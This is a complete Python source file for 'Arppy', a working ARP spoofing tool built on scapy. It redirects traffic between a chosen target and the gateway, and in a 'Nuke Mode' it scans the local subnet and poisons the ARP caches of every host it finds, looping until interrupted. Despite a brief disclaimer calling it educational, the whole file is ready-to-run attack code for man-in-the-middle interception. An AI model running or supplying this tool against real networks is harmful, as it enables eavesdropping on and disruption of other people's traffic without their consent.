#!/usr/bin/env python3
"""
Arppy

An ARP spoofing tool that can redirect traffic between a target and a gateway,
or spoof all devices on the network in 'Nuke Mode'.

This script is designed for educational purposes and to be run from the command line.
It provides a clean, informative output using the 'rich' library.
The core functions are modular and can be imported into other Python scripts.

Not to be used for malicious purposes. Always ensure you have permission to test networks.
"""
import scapy.all as scapy
import argparse
import time
import sys
import os
import ipaddress

# Import rich for sleek and informative output
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich.live import Live
from rich.text import Text

# Initialize Rich Console
console = Console()

def get_arguments():
    """Parses and returns command-line arguments."""
    parser = argparse.ArgumentParser(
        description="ARP Spoofer - Intercept traffic on the network.",
        formatter_class=argparse.RawTextHelpFormatter,
        epilog="""Examples:
  Targeted Spoof: sudo python3 spoofer.py -t 192.168.1.10 -g 192.168.1.1
  Nuke Mode:      sudo python3 spoofer.py -n
  Nuke Mode (10 scan rounds): sudo python3 spoofer.py -n -s 10"""
    )
    parser.add_argument("-n", "--nuke", action="store_true",
                        help="Nuke Mode: ARP spoof all active devices on the network.")
    parser.add_argument("-s", "--scan-rounds", dest="scan_rounds", type=int, default=3,
                        help="Number of scan rounds to discover devices in nuke mode. Default: 3")
    
    parser.add_argument("-t", "--target", dest="target_ip",
                        help="The IP address of the target machine.")
    parser.add_argument("-g", "--gateway", dest="gateway_ip",
                        help="The IP address of the gateway (e.g., the router).")

    args = parser.parse_args()

    if not args.nuke and not (args.target_ip and args.gateway_ip):
        console.print("[bold red]Error:[/] You must either specify --nuke mode OR provide both --target and --gateway.", style="bold red")
        parser.print_help()
        sys.exit(1)
        
    if args.nuke and (args.target_ip or args.gateway_ip):
        console.print("[bold yellow]Warning:[/] --nuke mode is active. Ignoring --target and --gateway arguments.", style="bold yellow")

    return args

def get_mac(ip: str) -> str | None:
    """Discovers the MAC address of a given IP address."""
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    
    answered_list = scapy.srp(arp_request_broadcast, timeout=2, verbose=False)[0]

    if answered_list:
        return answered_list[0][1].hwsrc
    return None

def get_gateway_ip() -> str:
    """Finds the default gateway IP address of the local network."""
    try:
        gateway_ip = scapy.conf.route.route("0.0.0.0")[2]
        if gateway_ip == '0.0.0.0':
            raise IndexError
        return gateway_ip
    except (IndexError, ValueError):
        console.print("[bold red]Error:[/] Could not automatically determine the gateway IP. Please specify it manually with -g.", style="bold red")
        sys.exit(1)

def scan_network(network_cidr: str) -> list[dict]:
    """Scans the network to find all active clients and their MAC addresses."""
    arp_request = scapy.ARP(pdst=network_cidr)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    
    answered_list = scapy.srp(arp_request_broadcast, timeout=3, verbose=False)[0]
    
    clients_list = []
    for element in answered_list:
        client_dict = {"ip": element[1].psrc, "mac": element[1].hwsrc}
        clients_list.append(client_dict)
    return clients_list

def get_network_cidr() -> str:
    """
    Dynamically discovers the local network's CIDR notation in a cross-platform way.

    This function inspects Scapy's routing table to find the route corresponding
    to the primary local network interface, extracting the correct netmask from it.
    This avoids platform-specific issues with interface objects.

    Returns:
        str: The network address in CIDR notation (e.g., "192.168.1.0/24").
    """
    try:
        # Find the route to an external address (like Google's DNS) to identify our primary outbound IP
        # This returns a tuple: (iface_name, our_ip, gateway_ip)
        route_to_public = scapy.conf.route.route("8.8.8.8")
        my_ip = route_to_public[1]
        
        found_netmask = None
        # Iterate through Scapy's detailed internal routing table
        # Each entry is a tuple: (network, netmask, gateway, iface, output_ip, metric)
        for network, netmask, gw, iface, output_ip, metric in scapy.conf.route.routes:
            # We are looking for the route that handles our local subnet.
            # It matches our IP, is not a loopback address, and is not the default route (0.0.0.0).
            if my_ip == output_ip and network != 0:
                found_netmask = scapy.ltoa(netmask)
                break

        if not found_netmask:
            raise ValueError(f"Could not find a matching route for our IP {my_ip} in the routing table.")

        network = ipaddress.ip_network(f"{my_ip}/{found_netmask}", strict=False)
        return network.with_prefixlen

    except (IndexError, ValueError) as e:
        console.print(f"[bold red]Error:[/] Could not determine network CIDR automatically: {e}", style="bold red")
        console.print("[bold yellow]Please ensure you are connected to the network.", style="bold yellow")
        sys.exit(1)

def spoof(target_ip: str, spoof_ip: str, target_mac: str):
    """Sends a single spoofed ARP response to the target."""
    arp_packet = scapy.ARP(op=1, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    packet = scapy.Ether(dst=target_mac) / arp_packet
    scapy.sendp(packet, verbose=False)

def restore(destination_ip: str, source_ip: str, destination_mac: str, source_mac: str):
    """Restores the ARP table by sending a correct ARP response."""
    arp_response = scapy.ARP(
        op=2,
        pdst=destination_ip,
        hwdst=destination_mac,
        psrc=source_ip,
        hwsrc=source_mac
    )
    packet = scapy.Ether(dst=destination_mac) / arp_response
    scapy.sendp(packet, count=4, verbose=False)

def run_targeted_spoof(target_ip, gateway_ip):
    """Handles the logic for a standard, targeted ARP spoof."""
    console.print(Panel.fit(
        f"[bold cyan]ARPPY Initializing (Targeted Mode)[/bold cyan]\n"
        f"Target: [yellow]{target_ip}[/yellow]\n"
        f"Gateway: [yellow]{gateway_ip}[/yellow]",
        title="Configuration",
        border_style="green"
    ))

    with console.status("[bold green]Resolving MAC addresses...", spinner="dots"):
        target_mac = get_mac(target_ip)
        gateway_mac = get_mac(gateway_ip)

    if not target_mac:
        console.print(f"[bold red]Error:[/] Could not resolve MAC address for target IP: {target_ip}")
        sys.exit(1)
    if not gateway_mac:
        console.print(f"[bold red]Error:[/] Could not resolve MAC address for gateway IP: {gateway_ip}")
        sys.exit(1)

    mac_table = Table(title="Resolved MAC Addresses", show_header=True, header_style="bold magenta")
    mac_table.add_column("Host", style="dim", width=12)
    mac_table.add_column("IP Address", style="cyan")
    mac_table.add_column("MAC Address", style="yellow")
    mac_table.add_row("Target", target_ip, target_mac.replace(':', '-'))
    mac_table.add_row("Gateway", gateway_ip, gateway_mac.replace(':', '-'))
    console.print(mac_table)
    
    sent_packets_count = 0
    try:
        status_text = Text("Starting spoofing...", style="bold green")
        with Live(status_text, console=console, screen=False, refresh_per_second=4) as live:
            while True:
                spoof(target_ip, gateway_ip, target_mac)
                spoof(gateway_ip, target_ip, gateway_mac)
                sent_packets_count += 2
                live.update(Text(f"Spoofing active... Packets sent: {sent_packets_count}", style="bold green"))
                time.sleep(2)
    except KeyboardInterrupt:
        console.print("\n[bold yellow]! Keyboard interrupt detected. Restoring ARP tables...[/bold yellow]")
        restore(target_ip, gateway_ip, target_mac, gateway_mac)
        restore(gateway_ip, target_ip, gateway_mac, target_mac)
        console.print("[bold green]✔ ARP tables restored successfully. Exiting.[/bold green]")

def run_nuke_mode(args):
    """Handles the logic for Nuke Mode: spoofing all devices on the network."""
    console.print(Panel.fit(
        "[bold red] ☢ ARPPY NUKE MODE ACTIVATED ☢ [/bold red]\n"
        "Spoofing all devices on the network.",
        title="[blink]WARNING: Don't run without proper authorization and permission.[/blink]",
        border_style="red"
    ))

    with console.status("[bold green]Discovering network topology...", spinner="dots") as status:
        status.update("[bold green]Determining network range...")
        network_cidr = get_network_cidr()
        
        status.update(f"[bold green]Discovering gateway on {network_cidr}...")
        gateway_ip = get_gateway_ip()
        
        unique_hosts = {}
        for i in range(args.scan_rounds):
            status.update(f"[bold green]Scanning {network_cidr} for hosts (Round {i + 1}/{args.scan_rounds})...[/bold green]")
            
            current_scan_results = scan_network(network_cidr)
            
            for host in current_scan_results:
                unique_hosts[host['mac']] = host
        
        all_hosts = list(unique_hosts.values())

    if not all_hosts:
        console.print("[bold red]Error:[/] No active hosts found on the network.", style="bold red")
        sys.exit(1)

    gateway = None
    targets = []
    for host in all_hosts:
        if host['ip'] == gateway_ip:
            gateway = host
        else:
            targets.append(host)

    if not gateway:
        console.print(f"[bold red]Error:[/] Could not find gateway ({gateway_ip}) in the network scan.", style="bold red")
        sys.exit(1)
    if not targets:
        console.print("[bold yellow]Warning:[/] No other clients found on the network to target.", style="bold yellow")
        sys.exit(0)

    hosts_table = Table(title=f"Discovered Hosts on {network_cidr}", show_header=True, header_style="bold magenta")
    hosts_table.add_column("Type", style="dim", width=12)
    hosts_table.add_column("IP Address", style="cyan")
    hosts_table.add_column("MAC Address", style="yellow")
    hosts_table.add_row("[bold green]Gateway[/bold green]", gateway['ip'], gateway['mac'].replace(':', '-'))
    for target in targets:
        hosts_table.add_row("Target", target['ip'], target['mac'].replace(':', '-'))
    console.print(hosts_table)
    
    sent_packets_count = 0
    try:
        status_text = Text("Starting nuke...", style="bold red")
        with Live(status_text, console=console, screen=False, refresh_per_second=2) as live:
            while True:
                for target in targets:
                    spoof(target['ip'], gateway['ip'], target['mac'])
                    spoof(gateway['ip'], target['ip'], gateway['mac'])
                
                sent_packets_count += len(targets) * 2
                live.update(Text(
                    f"Nuke active. Spoofing {len(targets)} targets... Packets sent: {sent_packets_count}",
                    style="bold red"
                ))
                time.sleep(2)

    except KeyboardInterrupt:
        console.print(f"\n[bold yellow]! Keyboard interrupt detected. Restoring ARP tables for {len(targets)} targets...[/bold yellow]")
        for target in targets:
            restore(target['ip'], gateway['ip'], target['mac'], gateway['mac'])
            restore(gateway['ip'], target['ip'], gateway['mac'], target['mac'])
        console.print("[bold green]✔ All ARP tables restored successfully. Exiting.[/bold green]")

def main():
    """Main function to run the ARP spoofer in the selected mode."""
    args = get_arguments()
    
    try:
        if args.nuke:
            run_nuke_mode(args)
        else:
            run_targeted_spoof(args.target_ip, args.gateway_ip)
    except Exception as e:
        console.print(f"\n[bold red]An unexpected error occurred: {e}[/bold red]")
        console.print("[bold yellow]Exiting without restoring ARP tables. Network may be disrupted.[/bold yellow]")

if __name__ == "__main__":
    is_admin = False
    try:
        is_admin = (os.geteuid() == 0)
    except AttributeError:
        import ctypes
        is_admin = (ctypes.windll.shell32.IsUserAnAdmin() == 1)

    if not is_admin:
        console.print("[bold red]Error:[/] This script must run with administrative/root privileges.")
        console.print("[bold yellow]On Windows, right-click and 'Run as administrator'. On Linux/macOS, use 'sudo'.[/bold yellow]")
        sys.exit(1)
        
    main()
